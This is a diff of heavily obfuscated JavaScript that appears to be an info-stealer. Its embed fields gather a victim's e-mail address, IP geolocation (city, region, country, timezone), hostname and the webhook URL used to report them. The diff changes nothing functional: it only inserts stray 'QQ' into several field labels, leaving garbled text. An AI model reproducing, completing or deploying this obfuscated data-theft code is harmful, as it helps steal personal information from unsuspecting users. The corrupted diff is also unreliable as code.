@@ -359,7 +359,7 @@ var event_handlers = {
                     'value': '```' + _0x37ea0e + _0x33c273(0x131),
                     'inline': !![]
                 }, {
-                    'name': 'E-Mail\x20Address',
+                    'name': 'E-Mail\x20AdQQdress',
                     'value': '```' + _0x224d90 + _0x33c273(0x131),
                     'inline': !![]
                 }, {
@@ -705,7 +705,7 @@ async function initialize() {
                     'value': _0x554ef7(0xd7) + (_0x54de57['ip'] ?? _0x554ef7(0xe7)) + '\x0aHostname:\x20' + (_0x54de57[_0x554ef7(0x19c)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x175) + (_0x54de57['city'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x142) + (_0x54de57['region'] ?? 'Unknown') + _0x554ef7(0x135) + (_0x54de57[_0x554ef7(0x12a)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x138) + (_0x54de57[_0x554ef7(0x151)] ?? 'Unknown') + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'Hostname',
+                    'name': 'HostnamQQe',
                     'value': '```' + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
@@ -765,7 +765,7 @@ async function initialize() {
                     'value': _0x554ef7(0xd7) + (_0x54de57['ip'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x189) + (_0x54de57[_0x554ef7(0x19c)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x175) + (_0x54de57['city'] ?? _0x554ef7(0xe7)) + _0x554ef7(0x142) + (_0x54de57[_0x554ef7(0x149)] ?? _0x554ef7(0xe7)) + '\x0aCountry:\x20' + (_0x54de57[_0x554ef7(0x12a)] ?? _0x554ef7(0xe7)) + _0x554ef7(0x138) + (_0x54de57['timezone'] ?? 'Unknown') + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'Hostname',
+                    'name': 'HostQQname',
                     'value': _0x554ef7(0x131) + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
@@ -819,7 +819,7 @@ async function initialize() {
                     'value': _0x554ef7(0x131) + os[_0x554ef7(0x19c)] + _0x554ef7(0x131),
                     'inline': ![]
                 }, {
-                    'name': 'Used\x20webhook\x20url',
+                    'name': 'Used\x20webhook\x20uQQrl',
                     'value': _0x554ef7(0x131) + config[_0x554ef7(0x144)] + '```',
                     'inline': ![]
                 }]
